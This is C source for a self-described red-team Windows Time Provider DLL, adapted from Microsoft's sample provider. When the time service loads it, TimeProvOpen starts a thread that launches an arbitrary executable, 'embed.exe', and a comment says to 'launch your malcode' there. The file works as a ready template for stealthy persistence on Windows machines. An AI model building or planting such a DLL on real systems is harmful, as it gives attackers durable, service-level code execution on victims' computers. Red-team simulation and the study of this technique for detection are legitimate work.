/*

 Red Team Simulation template
 Time Provider DLL template
 
 Author: Shaikh Jamal Uddin (Linkedin: https://www.linkedin.com/in/engrjamal/)
 based on: https://docs.microsoft.com/en-us/windows/win32/sysinfo/sample-time-provider

*/

#include <windows.h>
#include "timeprov.h"

TimeProvSysCallbacks sc;
//WCHAR ProviderName1[] = L"MyCompanyMyAppProvider1";
const TimeProvHandle htp = (TimeProvHandle)1;
TpcGetSamplesArgs Samples;
DWORD dwPollInterval;

void Go(void) {
    STARTUPINFO info={sizeof(info)};
    PROCESS_INFORMATION processInfo;

	CreateProcess(
				"c:\\Windows Persistent\\Embed\\embed.exe", 
				"", NULL, NULL, TRUE, 0, NULL, NULL, 
				&info, &processInfo);

}

HRESULT CALLBACK TimeProvOpen(WCHAR *wszName, TimeProvSysCallbacks *pSysCallback, TimeProvHandle *phTimeProv) {

	// launch your malcode in a separate thread
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE) Go, 0, 0, 0);

	// Copy the system callback pointers to a buffer.
	CopyMemory(&sc, (PVOID)pSysCallback, sizeof(TimeProvSysCallbacks));
	*phTimeProv = htp;

   return S_OK;
}

HRESULT CALLBACK TimeProvCommand(TimeProvHandle hTimeProv, TimeProvCmd eCmd, PVOID pvArgs) {
   
   switch( eCmd ) {
      case TPC_GetSamples:
      // Return the Samples structure in pvArgs.
         CopyMemory(pvArgs, &Samples, sizeof(TpcGetSamplesArgs));
         break;
      case TPC_PollIntervalChanged:
      // Retrieve the new value.
         sc.pfnGetTimeSysInfo( TSI_PollInterval, &dwPollInterval );
         break;
      case TPC_TimeJumped:
      // Discard samples saved in the Samples structure.
         ZeroMemory(&Samples, sizeof(TpcGetSamplesArgs));
         break;
      case TPC_UpdateConfig:
      // Read the configuration information from the registry.
         break;
   }
   return S_OK;
}

HRESULT CALLBACK TimeProvClose(TimeProvHandle hTimeProv) {
   return S_OK;
}
